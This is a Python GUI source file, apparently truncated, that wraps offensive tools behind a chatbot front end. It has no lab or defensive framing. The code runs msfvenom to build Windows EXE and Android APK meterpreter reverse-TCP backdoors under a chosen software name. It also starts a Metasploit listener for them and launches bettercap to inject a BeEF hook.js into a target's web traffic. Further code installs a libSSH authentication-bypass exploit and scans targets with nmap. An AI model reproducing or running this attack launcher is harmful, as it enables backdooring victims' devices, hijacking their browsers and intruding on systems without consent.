#Program created by TheOperationTroupe (Ryuzaki Tz)
import os
import sys
import platform
import subprocess
import webbrowser

try :
    import tkinter as tk
    from tkinter import messagebox
    from tkinter import Tk,Button,Frame,Entry,END
    from PIL import Image
    from tkinter import *
    import tkinter.scrolledtext as ScrolledText
   #import pygame
    import sys
    from chatterbot import ChatBot
    from chatterbot.trainers import ListTrainer

except:
	os.system("cd /root && apt-get update -y && apt-get install python3-pip -y && python-pip -y")
	os.system("cd /root && apt-get install python3-tk -y")
	#if sys.platform == "Linux" or "Linux2" or "Linux3":
	#os.system('cd /root && pip3 install pygame ')
	os.system('cd /root && pip3 install chatterbot ')
	os.system('cd /root && pip3 install chatterbot_corpus')
	os.system('cd /root && apt-get install gnome-terminal -y')
	#if sys.platform == "Windows":
	#	os.system('py -m pip install -U pygame --user')
	#	os.system('py -m pygame.examples.aliens')
	import tkinter as tk
	from tkinter import messagebox
	from tkinter import Tk,Button,Frame,Entry,END,BOTH
	from tkinter import *
	import tkinter.scrolledtext as ScrolledText
	#import pygame
	import sys
	from chatterbot import ChatBot
	from chatterbot.trainers import ListTrainer

class network_info:
    #Store the IP of your Target and port, Your local ip and the software name
    local_ip = ""
    target_ip = ""
    port = ""
    software_name = ""
    url = ""


class digitilize_main_window:
	
	#window configuration
	
	def __init__(self,master):
		self.master = master
		self.frame = tk.Frame(self.master)
		self.master.title ('Re:Digitilize')
		self.master.configure (background = "dark green")
		#pygame.init()
		self.chatbot = ChatBot ('Ryuzaki',
		storage_adapter = 'chatterbot.storage.SQLStorageAdapter',
		logic_adapters = [ "chatterbot.logic.BestMatch"],
		database_uri = "sqlite:///database.sqlite3"
		)
		trainer = ListTrainer(self.chatbot)
		trainer.train([
		"Hello, how may i help you?",
		])
		
		self.initialize()
		
		self.frame.pack()
	
	def initialize(self):
		#send message button
		self.send_message = tk.Button(self.frame, text = "Send", width = 25 , command = self.get_response)
		self.send_message.configure(background = "black",fg = "white")
		self.send_message.pack()
		
		#conversation
		self.conversation_lbl = tk.Label(self.frame, text = 'Converastion :', width = 28)
		self.conversation_lbl.configure(background = "dark red", fg = "gold")
		self.conversation_lbl.pack()

		#user input
		self.usr_input = tk.Entry(self.frame, width = 28, state = 'normal')
		self.usr_input.configure(background = "dark red", fg = "gold")
		self.usr_input.pack()
		
		
		#Digitilization_Start
		self.button_digitilization = tk.Button(self.frame,text = "Re:Digitilize",width = 25, command = self.digitilize_window_start)
		self.button_digitilization.configure(background = "dark green")
		self.button_digitilization.pack()
		
		#Scrolled Text
		self.conversation = ScrolledText.ScrolledText(self.frame, state = 'disabled')
		self.conversation.configure(background = "dark red",fg = "gold")
		self.conversation.pack()
		
		#exit
		self.bquit = tk.Button (self.frame, text = "Quit", width = 25, command = self.close_window_ai)
		self.bquit.configure (background = "black", fg = "white")
		self.bquit.pack()
		
		
	def get_response(self):
		user_input = self.usr_input.get()
		if user_input == "re:digitilize":
			self.digitilize_window_start()
			
		elif user_input == "nmap":
			self.nmap_window()
			
		elif user_input == "bettercap":
			self.bettercap_window()
			
		elif user_input == "metasploit":
			self.metasploit_window()
		
		elif user_input == "sqlmap":
			self.sqlmap_window()
		
		elif user_input == "exploit db":
			self.exploit_db_window()
		
		elif user_input == "shodan":
			self.shodan_window()
		
		elif user_input == "whatweb":
			self.whatweb_window()
		
		elif user_input == "bluto":
			self.start_bluto()
		
		elif user_input == "certification":
			self.start_crt()
		
		elif user_input == "installs":
			self.installs_window()
		
		#elif user_input == "music on":
		#	self.play_music()
		
		#elif user_input == "music off":
		#	self.stop_music()
		
		elif user_input == "exit":
			self.close_window_ai()
		
		else:
			self.usr_input.delete(0, tk.END)
			response = self.chatbot.get_response(user_input)
			self.conversation['state'] = 'normal'
			self.conversation.insert(
				tk.END,"Human: "+ user_input + "\n" + "Ryuzaki: " +str(response.text) + "\n"
			)
			self.conversation['state'] = 'disabled'
		
		self.frame.pack()
	
	def digitilize_window_start(self):
		#start digitilization program
		self.digitilize_window_start = tk.Toplevel(self.master)
		self.app = start_digitilize(self.digitilize_window_start)
		
	def nmap_window(self):
		#Open NMAP window
		self.nmap_window_start = tk.Toplevel(self.master)
		self.app = nmap_section(self.nmap_window_start)
	
	def bettercap_window(self):
		#Open Bettercap Window
		self.bettercap_window_start = tk.Toplevel(self.master)
		self.app = bettercap_section(self.bettercap_window_start)
		
	def metasploit_window(self):
		#open metasploit window
		self.metasploit_window_start = tk.Toplevel(self.master)
		self.app = metasploit_section(self.metasploit_window_start)

	def sqlmap_window(self):
		#open sqlmap window
		self.sqlmap_window_start = tk.Toplevel(self.master)
		self.app = sqlmap_section(self.sqlmap_window_start)

	def exploit_db_window(self):
		#open exploit database window
		self.exploit_db_window_start = tk.Toplevel(self.master)
		self.app = exploit_db_section(self.exploit_db_window_start)
	
	def shodan_window(self):
		#shodan window
		self.shodan_window_start = tk.Toplevel(self.master)
		self.app = shodan_section(self.shodan_window_start)

	def whatweb_window(self):
		#open whatweb window
		self.whatweb_window_start = tk.Toplevel(self.master)
		self.app = whatweb_section(self.whatweb_window_start)

	def start_bluto(self):
		os.system("gnome-terminal -x bluto")

	def start_crt(self):
		webbrowser.open("https://crt.sh/")
	
	def installs_window(self):
		#open installs window
		self.installs_window_start = tk.Toplevel(self.master)
		self.app = installs_section(self.installs_window_start)
		
	#def play_music(self):
		#start music
	#	pygame.mixer.music.load("song.mp3")
	#	pygame.mixer.music.play()
		
	#def stop_music(self):
		#stop music
	#	pygame.mixer.music.pause()	
	
	def close_window_ai(self):
		self.master.destroy()
		
class start_digitilize:
	def __init__(self,master):
		#Digitilization Window
		self.master = master 
		self.frame = tk.Frame(self.master)
		self.master.title = ('Re:Digitilize')
		self.master.configure (background = "dark green")
		
		#Buttons
		
		#Set Local IP
		self.button_local_ip = tk.Button(self.frame, text = "Set Local IP", width = 25 , command = self.set_local_ip)
		self.button_local_ip.configure(background ="cyan")
		self.button_local_ip.pack()
		
		#Change target IP
		self.button_target_ip = tk.Button(self.frame, text = "Change Target Ip", width = 25 ,command = self.change_target_ip)
		self.button_target_ip.configure(background = "dark red",fg = "gold")
		self.button_target_ip.pack()
		
		#Set Port
		self.button_set_port = tk.Button (self.frame, text = "Set Target Port", width = 25 , command = self.set_port)
		self.button_set_port.configure(background = "dark red",fg = "gold")
		self.button_set_port.pack()
		
		#Bettercap Button
		self.button_bettercap = tk.Button (self.frame, text = "Bettercap Section", width = 25 , command = self.bettercap_window)
		self.button_bettercap.configure(background = "dark red",fg = "gold")
		self.button_bettercap.pack()
		
		#Metasploit Button
		self.button_metasploit = tk.Button (self.frame, text = "Metasploit Section", width = 25, command = self.metasploit_window)
		self.button_metasploit.configure(background = "dark red",fg = "gold")
		self.button_metasploit.pack()

		#SQLMAP
		self.button_sqlmap = tk.Button (self.frame, text = "SQLMAP Section", width = 25 , command = self.sqlmap_window)
		self.button_sqlmap.configure(background = "dark red",fg = "gold")
		self.button_sqlmap.pack()

		#Exploit Button
		self.button_exploit_db = tk.Button (self.frame, text = "Exploit Database Section", width = 25 , command = self.exploit_db_window)
		self.button_exploit_db.configure(background = "dark red",fg = "gold")
		self.button_exploit_db.pack()

		#NMAP Button
		self.button_nmap = tk.Button(self.frame, text = "Nmap Section", width = 25 , command = self.nmap_window)
		self.button_nmap.configure (background = "green2")
		self.button_nmap.pack()

		#shodan
		self.button_shodan = tk.Button (self.frame, text = "Shodan Section" , width = 25 , command = self.shodan_window)
		self.button_shodan.configure ( background = "green2")
		self.button_shodan.pack()

		#Whatweb
		self.button_whatweb = tk.Button (self.frame, text = "whatweb Section" , width = 25 , command = self.whatweb_window)
		self.button_whatweb.configure (background = "green2")
		self.button_whatweb.pack()

		#Bluto
		self.button_bluto = tk.Button(self.frame, text = "Start Bluto", width = 25, command = self.start_bluto)
		self.button_bluto.configure(background = "green2")
		self.button_bluto.pack()

		#Certification search
		self.button_crt = tk.Button (self.frame, text = "Certification Search", width = 25 , command = self.start_crt)
		self.button_crt.configure(background = "green2")
		self.button_crt.pack()
		
		#Installs Window
		self.button_installs =tk.Button (self.frame, text = "Installs", width = 25 , command = self.installs_window)
		self.button_installs.configure(background = "aquamarine2")
		self.button_installs.pack()
		
		#Music Buttons
		#self.button_play_music = tk.Button(self.frame, text = "Play Music", width = 25 , command = self.play_music)
		#self.button_play_music.configure(background = "purple1")
		#self.button_play_music.pack()
		
		#self.button_stop_music = tk.Button(self.frame, text = "Stop Music", width = 25 , command = self.stop_music)
		#self.button_stop_music.configure(background = "purple1")
		#self.button_stop_music.pack()
		
		#Exit Button
		self.button_exit = tk.Button (self.frame, text = "Exit", width =  25 , command = self.exit_software)
		self.button_exit.configure (background = "black", fg = "gold")
		self.button_exit.pack()
		
		#Entries
		
		#Local IP Address Change
		self.new_local_ip = Entry (self.master,width = 28)
		self.new_local_ip.configure(background = "cyan")
		self.new_local_ip.pack(before = self.button_local_ip )
		
		#Target IP Address Change
		self.new_target_ip = Entry(self.master,width = 28)
		self.new_target_ip.configure(background ="red2")
		self.new_target_ip.pack(before = self.button_target_ip)
		
		#Change Port
		self.new_port_change = Entry (self.master,width =28)
		self.new_port_change.configure(background = "red3")
		self.new_port_change.pack(before = self.button_set_port)
		
		
		#Pack everything
		self.frame.pack(fill = BOTH, expand = 1)
	
	def set_local_ip(self):
		#Set the Local IP
		global new_local_ip
		local_ip1 = self.new_local_ip.get()
		network_info.local_ip = local_ip1
		print(network_info.local_ip)
		
	def change_target_ip(self):
		#Set the Target ip
		global new_target_ip
		target_ip1 = self.new_target_ip.get()
		network_info.target_ip = target_ip1
		print(network_info.target_ip)
	
	def set_port(self):
		#set the port
		global new_port_change
		port1 = self.new_port_change.get()
		network_info.port = port1
		print(network_info.port)
	
	def nmap_window(self):
		#Open NMAP window
		self.nmap_window_start = tk.Toplevel(self.master)
		self.app = nmap_section(self.nmap_window_start)
	
	def bettercap_window(self):
		#Open Bettercap Window
		self.bettercap_window_start = tk.Toplevel(self.master)
		self.app = bettercap_section(self.bettercap_window_start)
		
	def metasploit_window(self):
		#open metasploit window
		self.metasploit_window_start = tk.Toplevel(self.master)
		self.app = metasploit_section(self.metasploit_window_start)

	def sqlmap_window(self):
		#open sqlmap window
		self.sqlmap_window_start = tk.Toplevel(self.master)
		self.app = sqlmap_section(self.sqlmap_window_start)

	def exploit_db_window(self):
		#open exploit database window
		self.exploit_db_window_start = tk.Toplevel(self.master)
		self.app = exploit_db_section(self.exploit_db_window_start)
	
	def shodan_window(self):
		#shodan window
		self.shodan_window_start = tk.Toplevel(self.master)
		self.app = shodan_section(self.shodan_window_start)

	def whatweb_window(self):
		#open whatweb window
		self.whatweb_window_start = tk.Toplevel(self.master)
		self.app = whatweb_section(self.whatweb_window_start)

	def start_bluto(self):
		os.system("gnome-terminal -x bluto")

	def start_crt(self):
		webbrowser.open("https://crt.sh/")
	
	def installs_window(self):
		#open installs window
		self.installs_window_start = tk.Toplevel(self.master)
		self.app = installs_section(self.installs_window_start)
		
	def play_music(self):
		#start music
		pygame.mixer.music.load("song.mp3")
		pygame.mixer.music.play()
		
	def stop_music(self):
		#stop music
		pygame.mixer.music.pause()		
		
	def exit_software(self):
		#Close Software
		self.master.destroy()
		
class nmap_section:
	def __init__(self, master):
		#Configure
		self.master = master
		self.frame = tk.Frame(self.master)
		self.master.configure (background = "midnight blue")
		self.master.title ("Nmap Section")
	
		#set your local ip
		self.get_ip = Entry(self.master,width = 28)
		self.get_ip.configure(background ="cyan")
		self.get_ip.pack()
		self.get_ip.focus_set()
	
		#Change the local ip (button)
		self.change_ipb = tk.Button (self.master,text ="Enter Local IP ",width = 25 ,command = self.system_ip_change)
		self.change_ipb.configure(background ="cyan")
		self.change_ipb.pack()
	
		#Label
		self.Label = tk.Label (self.master, text="Choose your Commands : ",width = 28)
		self.Label.configure(background = "blue", fg = "gold")
		self.Label.pack()
		    
		#CheckButtons
		self.sL_scan = IntVar()
		self.Checkbutton = tk.Checkbutton (self.master, text = "Lists targets only (-sL)", variable = self.sL_scan,width = 25)
		self.Checkbutton.configure(background = "ghost white")
		self.Checkbutton.pack()
		    
		self.sn_scan = IntVar()
		self.Checkbutton1 = tk.Checkbutton (self.master, text = "No port scan (-sn) ", variable = self.sn_scan,width = 25)
		self.Checkbutton1.configure(background = "snow")
		self.Checkbutton1.pack()
		    
		self.sS_scan = IntVar()
		self.Checkbutton2 = tk.Checkbutton (self.master, text = "TCP SYN Scan(-sS)",variable = self.sS_scan,width = 25)
		self.Checkbutton2.configure(background = "dark green", fg = "red")
		self.Checkbutton2.pack()
		    
		self.sT_scan = IntVar()
		self.Checkbutton3 = tk.Checkbutton (self.master, text = "TCP Connect Scan(-sT)",variable = self.sT_scan,width = 25)
		self.Checkbutton3.configure(background = "dark green", fg = "red")
		self.Checkbutton3.pack()
		
		self.sA_scan = IntVar()
		self.Checkbutton5 = tk.Checkbutton (self.master, text ="TCP ACK port scan(-sA)",variable = self.sA_scan,width = 25)
		self.Checkbutton5.configure(background = "dark green", fg = "red")
		self.Checkbutton5.pack()
		
		self.sU_scan = IntVar()
		self.Checkbutton4 = tk.Checkbutton (self.master, text ="UDP port Scan(-sU)",variable = self.sU_scan,width = 25)
		self.Checkbutton4.configure(background = "yellow", fg = "black")
		self.Checkbutton4.pack()
		    
		self.sV_scan = IntVar()
		self.Checkbutton6 = tk.Checkbutton (self.master, text ="Version Scan(-sV)",variable = self.sV_scan,width = 25)
		self.Checkbutton6.configure(background = "green", fg = "red")
		self.Checkbutton6.pack()
		
		self.A_scan = IntVar()
		self.Checkbutton7 = tk.Checkbutton (self.master, text ="OS,Version,Script,Traceroute(-A)",variable = self.A_scan,width = 25)
		self.Checkbutton7.configure(background = "green", fg = "red")
		self.Checkbutton7.pack()
		
		self.O_scan = IntVar()
		self.Checkbutton8 = tk.Checkbutton (self.master, text="OS Scan" , variable= self.O_scan,width = 25)
		self.Checkbutton8.configure(background = "green", fg = "red")
		self.Checkbutton8.pack()
		
		self.T0_scan = IntVar()
		self.Checkbutton9 = tk.Checkbutton (self.master, text="Paranoid Speed (-T0)",variable= self.T0_scan,width = 25)
		self.Checkbutton9.configure(background = "azure")
		self.Checkbutton9.pack()
		
		self.T1_scan = IntVar()
		self.Checkbutton10 = tk.Checkbutton (self.master, text="Sneaky Speed (-T1)",variable= self.T1_scan,width = 25)
		self.Checkbutton10.configure(background = "azure")
		self.Checkbutton10.pack()
		
		self.T2_scan = IntVar()
		self.Checkbutton11 = tk.Checkbutton (self.master, text = "Polite Speed (-T2)",variable = self.T2_scan,width = 25)
		self.Checkbutton11.configure(background = "azure")
		self.Checkbutton11.pack()
		
		self.T3_scan = IntVar()
		self.Checkbutton12 = tk.Checkbutton (self.master, text = "Normal Speed/Default(-T3)",variable = self.T3_scan,width = 25)
		self.Checkbutton12.configure(background = "azure")
		self.Checkbutton12.pack()
		
		self.T4_scan = IntVar()
		self.Checkbutton13 = tk.Checkbutton (self.master, text = "Aggressive Speed(-T4)",variable = self.T4_scan,width = 25)
		self.Checkbutton13.configure(background = "azure")
		self.Checkbutton13.pack()
		
		self.T5_scan = IntVar()
		self.Checkbutton14 = tk.Checkbutton (self.master, text = "Insane Speed(-T5)",variable = self.T5_scan,width = 25)
		self.Checkbutton14.configure(background = "azure")
		self.Checkbutton14.pack()	
		    
		self.PR_scan = IntVar()
		self.Checkbutton15 = tk.Checkbutton (self.master, text = "ARP discovery on Local (-PR)",variable = self.PR_scan,width = 25)
		self.Checkbutton15.configure(background = "dark red", fg = "gold")
		self.Checkbutton15.pack()
		    
		self.n_scan = IntVar()
		self.Checkbutton16 = tk.Checkbutton (self.master, text = "Never do DNS resolution (-n)",variable = self.n_scan,width = 25)
		self.Checkbutton16.configure(background = "azure", fg = "black")
		self.Checkbutton16.pack()
		    
		self.sX_scan = IntVar()
		self.Checkbutton17 = tk.Checkbutton (self.master,text = "XMAS Scan(-sX)",variable = self.sX_scan,width = 25)
		self.Checkbutton17.configure (background = "red", fg = "green")
		self.Checkbutton17.pack()
		
		self.start_scan = tk.Button(self.master, text = "Scan Now", width = 25, command = self.scan_now)
		self.start_scan.configure(background = "green", fg = "black")
		self.start_scan.pack()
		
		self.quitButton = tk.Button(self.frame, text = 'Close', width = 25, command = self.close_nmap_window)
		self.quitButton.configure(background = "black", fg = "gold")
		self.quitButton.pack()
	
		self.frame.pack()
		
	def close_nmap_window(self):
		#close the window
		self.master.destroy()

	def system_ip_change(self):
		#Local IP Change
		global new_system_ip
		new_system_ip = self.get_ip.get()
		network_info.local_ip = new_system_ip
		print(network_info.local_ip)
		
	def scan_now(self):
		#scan commands
		comm = "nmap "+network_info.local_ip
		command_0 = ""
		command_1 = ""
		command_2 = ""
		command_3 = ""
		command_4 = ""
		command_5 = ""
		command_6 = ""
		command_7 = ""
		command_8 = ""
		command_9 = ""
		command_10 = ""
		command_11 = ""
		command_12 = ""
		command_13 = ""
		command_14 = ""
		command_15 = ""
		command_16 = ""
		command_17 = ""
		
		if self.sL_scan.get() == 1:
		    command_0 = " -sL"
		if self.sn_scan.get() == 1:
		    command_1 = " -sn"
		if self.sS_scan.get() == 1:
		    command_2 = " -sS"
		if self.sT_scan.get() == 1:
		    command_3 = " -sT"
		if self.sU_scan.get() == 1:
		    command_4 = " -sU"
		if self.sA_scan.get() == 1:
		    command_5 = " -sA"
		if self.sV_scan.get() == 1:
		    command_6 = " -sV"
		if self.A_scan.get() == 1:
		    command_7 = " -A"
		if self.O_scan.get() == 1:
		    command_8 = " -O"
		if self.T0_scan.get() == 1:
		    command_9 = " -T0"
		if self.T1_scan.get() == 1:
		    command_10 = " -T1"
		if self.T2_scan.get() == 1:
		    command_11 = " -T2"
		if self.T3_scan.get() == 1:
		    command_12 = " -T3"
		if self.T4_scan.get() == 1:
		    command_13 = " -T4"
		if self.T5_scan.get() == 1:
		    command_14 = " -T5"
		if self.PR_scan.get() == 1:
		    command_15 = " -PR"
		if self.n_scan.get() == 1:
		    command_16 = " -n"
		if self.sX_scan.get() == 1:
		    command_17 = " -sX"
		
		if sys.platform == "Linux" or "Linux2":
		    os.system(comm + command_1 + command_2 + command_3 + command_4+ 
		    command_5 + command_6 + command_7 + command_8 + command_9+
		    command_10 + command_11 + command_12 + command_13 + command_14+
		    command_15 + command_16 + command_17)

		elif sys.platform == "Win32" or "Win64":
		    os.system("cd C:/Program Files (x86)/Nmap &&" + comm + command_1 + command_2 + command_3 + command_4+ 
		    command_5 + command_6 + command_7 + command_8 + command_9+
		    command_10 + command_11 + command_12 + command_13 + command_14+
		    command_15 + command_16 + command_17)

class bettercap_section:
	def __init__(self,master):
		#bettercap configuration
		self.master = master
		self.frame = tk.Frame(self.master)
		self.master.title ("Bettercap Section")
		
		#local IP
		self.get_local_ip = Entry (self.master, width = 28)
		self.get_local_ip.configure(background = "dark red" , fg = "gold")
		self.get_local_ip.pack()
		self.get_local_ip.focus_set()
		
		#Change local IP
		self.change_local_ip = tk.Button ( self.frame, text = "Enter your Local Ip", width = 25 , command = self.system_ip_change)
		self.change_local_ip.configure ( background = "cyan" , fg = "black")
		self.change_local_ip.pack()
		
		#Target ip
		self.get_target_ip = Entry (self.master , width = 28)
		self.get_target_ip.pack(after = self.change_local_ip)
		self.get_target_ip.configure(background = "dark red" , fg = "gold")
		
		#change Target IP
		self.change_target_ip = tk.Button(self.frame, text = "Enter Target IP", width = 25, command = self.target_ip_change)
		self.change_target_ip.pack()
		self.change_target_ip.configure(background = "dark red", fg = "gold")		
		
		#Start BEeF migration
		self.beef_migration = tk.Button(self.frame, text = "Start BEeF migration", width = 25, command = self.start_beef)
		self.beef_migration.configure(background = "dark red", fg = "gold")
		self.beef_migration.pack()
		
		#Quit
		self.quit_button = tk.Button(self.frame, text = "Close", width = 25 , command = self.close_bettercap_window)
		self.quit_button.configure(background = "black", fg = "gold")
		self.quit_button.pack()
		
		self.frame.pack()
	
	def system_ip_change(self):
		#local ip 
		global new_local_ip
		new_local_ip = self.get_local_ip.get()
		network_info.local_ip = new_local_ip
		print("Local IP: " + network_info.local_ip)
	
	def target_ip_change(self):
		#target ip
		global new_target_ip
		new_target_ip = self.get_target_ip.get()
		network_info.target_ip = new_target_ip
		print("Target Ip: " + network_info.target_ip)
		
	def start_beef(self):
		#start the Bettercap migration with beef
		os.system('gnome-terminal -x bettercap -X -T '+network_info.target_ip+' --proxy --proxy-module injectjs --js-url "http://'+network_info.local_ip+':3000/hook.js"')

	def close_bettercap_window(self):
		#close the window
		self.master.destroy()
		
class installs_section:
	def __init__(self,master):
		#initialize
		self.master = master
		self.frame = tk.Frame(self.master)
		self.master.title("Installs Section")
		
		#bettercap install
		self.bettercap_install = IntVar()
		self.Checkbutton_bettercap = tk.Checkbutton (self.master, text = "Install Bettercap 1.6.2", width = 25, variable = self.bettercap_install)
		self.Checkbutton_bettercap.configure(background = "dark red", fg = "gold")
		self.Checkbutton_bettercap.pack()
		
		#Nmap install
		self.nmap_install = IntVar()
		self.Checkbutton_nmap = tk.Checkbutton (self.master, text = "Install Nmap", width = 25, variable = self.nmap_install)
		self.Checkbutton_nmap.configure(background = "green", fg = "black")
		self.Checkbutton_nmap.pack()
		
		#Metasploit framework install
		self.msf_install = IntVar()
		self.Checkbutton_msf = tk.Checkbutton (self.master, text = "Install Metasploit", width = 25,variable = self.msf_install)
		self.Checkbutton_msf.configure(background = "dark red",fg = "gold")
		self.Checkbutton_msf.pack()
		
		#Ssh scanner install
		self.ssh_scanner_install = IntVar()
		self.Checkbutton_ssh_scanner = tk.Checkbutton (self.master, text = "Install lib ssh scanner", width = 25, variable = self.ssh_scanner_install)
		self.Checkbutton_ssh_scanner.configure(background = "green", fg = "black")
		self.Checkbutton_ssh_scanner.pack()
		
		#Sensors install
		self.sensors_install = IntVar()
		self.Checkbutton_sensors = tk.Checkbutton (self.master, text ="Sensors", width = 25,variable = self.sensors_install)
		self.Checkbutton_sensors.configure(background = "green", fg = "black")
		self.Checkbutton_sensors.pack()
		
		#SQLmap install
		self.sqlmap_install = IntVar()
		self.Checkbutton_sqlmap = tk.Checkbutton (self.master, text = "SQLMap", width = 25, variable = self.sqlmap_install)
		self.Checkbutton_sqlmap.configure(background = "dark red", fg = "gold")
		self.Checkbutton_sqlmap.pack()
		
		#Dependecies install
		self.dependecies_install = IntVar()
		self.Checkbutton_dependecies = tk.Checkbutton (self.master, text ="Dependecies", width = 25, variable = self.dependecies_install)
		self.Checkbutton_dependecies.configure(background = "green", fg = "black")
		self.Checkbutton_dependecies.pack()

		#Bluto install
		self.bluto_install = IntVar()
		self.Checkbutton_bluto = tk.Checkbutton (self.master, text = "Bluto", width = 25 , variable = self.bluto_install)
		self.Checkbutton_bluto.configure(background = "green", fg = "black")
		self.Checkbutton_bluto.pack()
		
		#Start the installs for linux
		self.button_linux_installs = tk.Button(self.master , text = "Linux Installs", width = 25 , command = self.linux_installs)
		self.button_linux_installs.configure(background = "blue", fg = "gold")
		self.button_linux_installs.pack()
		
		#Start the installs for windows 
		self.button_windows_installs = tk.Button(self.master, text = "Windows Installs", width = 25 , command = self.windows_installs)
		self.button_windows_installs.configure(background = "blue", fg = "gold")
		self.button_windows_installs.pack()

		#Close window button
		self.button_close_installs = tk.Button(self.master , text = "Close Installs", width = 25 , command = self.close_linux_installs)
		self.button_close_installs.configure (background= "black", fg = "gold")
		self.button_close_installs.pack()
		
	def linux_installs(self):
		#nmap install 
		if self.nmap_install.get() == 1 :
		    os.system("sudo cd /root && apt-get install nmap")
		    print ("Done")
		
		#bettercap install
		if self.bettercap_install.get() == 1 :
		    os.system("cd /root && apt-remove bettercap")
		    os.system("cd /root && apt install ruby-packetfu ruby-colorize ruby-net-dns ruby-em-proxy ruby-network-interface")
		    os.system("cd /root && wget https://github.com/v1s1t0r1sh3r3/bettercap1.6.2/raw/master/bettercap_1.6.2-0parrot1_all.deb")
		    os.system("cd /root && dpkg -i bettercap_1.6.2-0parrot1_all.deb")
		    os.system("cd /root && apt-mark hold bettercap")
		    print("Done")
		
		#msf install
		if self.msf_install.get() == 1:
		    os.system("cd /root && apt-get install metasploit-framework")
		    print("Done")
		
		#ssh scanner	
		if self.ssh_scanner_install.get() == 1 :
		    os.system("cd /root && git clone https://github.com/leapsecurity/libssh-scanner.git")
		    os.system("cd /root/libssh-scanner && pip install -r requirements.txt")
		    os.system("cd /root && git clone https://github.com/purplesec/libSSH-Authentication-Bypass.git")
		    os.system("cd /root/libSSH-Authentication-Bypass && pip install -r requirements.txt")
		    print("Done")
		    
		if self.sqlmap_install.get() == 1 :
		    os.system("cd /root && git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev")
		    os.system("cd /root && mv sqlmap-dev sqlmap")
		    print("Done")
		
		#sensors install	
		if self.sensors_install.get() == 1:
		    os.system ("cd /root && apt-get install lm-sensors")
		    print("Done")
		   
		#dependencies install
		if self.dependecies_install.get() == 1:
		    os.system('cd /root && apt install ruby-packetfu ruby-colorize ruby-net-dns ruby-em-proxy ruby-network-interface')
		    print("Done")

		#bluto install
		if self.bluto_install.get() == 1:
		    os.system('cd /root && pip install bluto')
		    print("Done")
	

		#Windows Installs
	def windows_installs(self):
		#nmap

		if self.nmap_install.get() == 1 :
		    os.system("curl https://nmap.org/dist/nmap-7.80-setup.exe -O C:/Users/%USERNAME%/Documents/mementos")
		    os.system("start nmap-7.80-setup.exe")

		#metasploit
		if self.msf_install.get()== 1:
		   os.system("curl https://windows.metasploit.com/metasploitframework-latest.msi -O C:/Users/%USERNAME%/Documents/mementos")
		   os.system("start metasploitframework-latest.msi")

		
	def close_linux_installs(self):
		self.master.destroy()
		    
class metasploit_section:
	def __init__(self,master):
		#configure
		self.master = master
		self.frame = tk.Frame(self.master)
		self.master.title ("Metasploit Framework")
		
		#buttons
		
		self.change_local_ip = tk.Button(self.frame, text = "Enter your Local IP", width = 25 , command = self.local_ip)
		self.change_local_ip.configure (background = "cyan", fg = "black")
		self.change_local_ip.pack()
		
		self.change_target_ip = tk.Button(self.frame, text = "Enter your Target IP",width = 25 , command = self.target_ip)
		self.change_target_ip.configure(background = "dark red", fg ="gold")
		self.change_target_ip.pack()
		
		self.change_target_port = tk.Button(self.frame, text = "Enter your Target PORT", width = 25 , command = self.target_port)
		self.change_target_port.configure(background = "dark red" , fg = "gold")
		self.change_target_port.pack()
		
		self.button_exe_name = tk.Button(self.frame, text = "Enter a name for software", width = 25 , command = self.exe_name)
		self.button_exe_name.configure(background = "cyan", fg = "black")
		self.button_exe_name.pack()
		
		self.button_generate_exe = tk.Button(self.frame, text = "Generate EXE", width = 25 , command = self.generate_exe)
		self.button_generate_exe.configure (background = "dark red", fg = "gold")
		self.button_generate_exe.pack()
		
		self.button_generate_app = tk.Button(self.frame,text = "Generate APK", width = 25 , command = self.generate_app)
		self.button_generate_app.configure(background = "dark red", fg = "gold")
		self.button_generate_app.pack()
		
		self.button_generate_msf = tk.Button(self.frame,text = "Start Metasploit", width = 25, command = self.start_msf_windows)
		self.button_generate_msf.configure(background = "dark red", fg = "gold")
		self.button_generate_msf.pack()
		
		self.button_quit = tk.Button(self.frame,text = "Close", width = 25 , command = self.close_metasploit_window)
		self.button_quit.configure(background = "black", fg ="gold")
		self.button_quit.pack()
		
		#Entries
		
		self.new_local_ip = Entry (self.master,width = 28)
		self.new_local_ip.pack(before = self.change_local_ip)
		self.new_local_ip.configure (background = "cyan" , fg = "black")
		
		self.new_target_ip = Entry(self.master,width = 28)
		self.new_target_ip.pack(before = self.change_target_ip)
		self.new_target_ip.configure(background = "dark red", fg = "gold")
		
		self.new_port = Entry(self.master,width = 28)
		self.new_port.pack(before = self.change_target_port)
		self.new_port.configure (background = "dark red", fg = "gold")
		
		self.new_name = Entry(self.master,width = 28)
		self.new_name.pack(before = self.button_exe_name)
		self.new_name.configure(background = "cyan", fg = "black")
		
		self.frame.pack()
		
	def local_ip (self):
		#set your Local IP
		global new_local_ip
		ip1 = self.new_local_ip.get()
		network_info.local_ip = ip1
		print(network_info.local_ip)
		
	def target_ip (self):
		#Set the Local or Public ip address of your target
		global new_target_ip
		target_ip1 = self.new_target_ip.get()
		network_info.target_ip = target_ip1
		print(network_info.target_ip)
		
	def target_port(self):
		#set the port of your target
		global new_port
		target_port1 = self.new_port.get()
		network_info.port = target_port1
		print(network_info.port)

	def exe_name(self):
		#set name for your exe
		global new_name
		new_name1 = self.new_name.get()
		network_info.software_name = new_name1
		print(network_info.software_name)

	def generate_exe(self):
		#Generate payload for windows
		os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST='+network_info.local_ip+ " LPORT="+network_info.port+" R>/root/Desktop/"+network_info.software_name+".exe")
		
	def generate_app(self):
		#generate apk for android
		os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST='+network_info.local_ip+ " LPORT="+network_info.port+" R>/root/Desktop/"+network_info.software_name+".apk")

	def start_msf_windows(self):
		#start Metasploit for windows payload
		os.system("gnome-terminal -x msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST "+network_info.local_ip+"; set LPORT "+network_info.port+"; exploit;'")

	def start_msf_android(self):
		#start metasploit for android payload
		os.system("gnome-terminal -x msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST "+network_info.local_ip+"; set LPORT "+network_info.port+"; exploit;'")
		
	def metasploit_quit(self):
		#close window
		self.master.destroy()

	def close_metasploit_window(self):
		#close the window
		self.master.destroy()
		
class sqlmap_section:
	def __init__(self,master):
		self.master = master
		self.frame = tk.Frame(self.master)
		self.master.title ("SQLmap")
	
		

		#buttons
	
		#Enter URL
		self.button_enter_target_url = tk.Button(self.frame, text = "Enter target URL", width = 25, command = self.change_target_url)
		self.button_enter_target_url.configure(background = "dark red", fg = "gold")
		self.button_enter_target_url.pack()
	
